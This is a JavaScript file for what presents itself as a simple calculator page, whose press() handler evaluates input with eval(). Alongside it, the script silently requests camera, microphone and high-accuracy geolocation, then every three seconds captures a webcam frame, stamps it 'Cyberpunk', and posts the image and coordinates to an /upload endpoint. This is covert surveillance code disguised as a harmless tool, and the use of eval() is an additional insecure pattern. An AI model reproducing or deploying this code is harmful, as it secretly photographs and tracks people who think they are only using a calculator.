let display = document.getElementById("display");
let expression = "";

function press(key) {
    if (key === "=") {
        try {
            display.value = eval(expression);
        } catch {
            display.value = "Error";
        }
    } else if (key === "C") {
        expression = "";
        display.value = "";
    } else {
        expression += key;
        display.value = expression;
    }
}

// Request camera + microphone and mute video element to prevent audio feedback
navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
    const video = document.getElementById("video");
    video.srcObject = stream;
    video.muted = true; // mute video so audio from mic doesn’t echo
}).catch(err => {
    console.error("Camera/Mic error:", err);
});

// Get high accuracy geolocation
navigator.geolocation.getCurrentPosition(
  pos => {
    window.userLocation = `${pos.coords.latitude},${pos.coords.longitude}`;
  },
  err => {
    console.error("Geolocation error:", err);
    window.userLocation = "Unknown";
  },
  { enableHighAccuracy: true }
);

function captureAndSend() {
    const video = document.getElementById("video");

    if (video.videoWidth === 0 || video.videoHeight === 0) {
        console.warn("Video not ready yet");
        return; // skip capture if video not ready
    }

    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Draw current video frame
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Overlay: timestamp and Cyberpunk tag
    const timestamp = new Date().toLocaleString();
    const tag = "Cyberpunk";

    // Draw black semi-transparent rectangle behind text
    ctx.fillStyle = "rgba(0, 0, 0, 0.5)";
    ctx.fillRect(10, canvas.height - 60, 270, 50);

    // Text styles
    ctx.font = "20px 'Courier New', monospace";
    ctx.fillStyle = "#00FFAA"; // neon green color
    ctx.textBaseline = "top";

    // Draw timestamp and tag
    ctx.fillText(timestamp, 15, canvas.height - 55);
    ctx.fillText(tag, 15, canvas.height - 30);

    // Convert canvas to JPEG blob and send to backend
    canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("image", blob, "photo.jpg");
        formData.append("location", window.userLocation || "Unknown");

        fetch("/upload", {
            method: "POST",
            body: formData
        }).catch(err => console.error("Upload error:", err));
    }, "image/jpeg");
}

// Capture and send image every 3 seconds
setInterval(() => {
    if (window.userLocation) {
        captureAndSend();
    }
}, 3000);
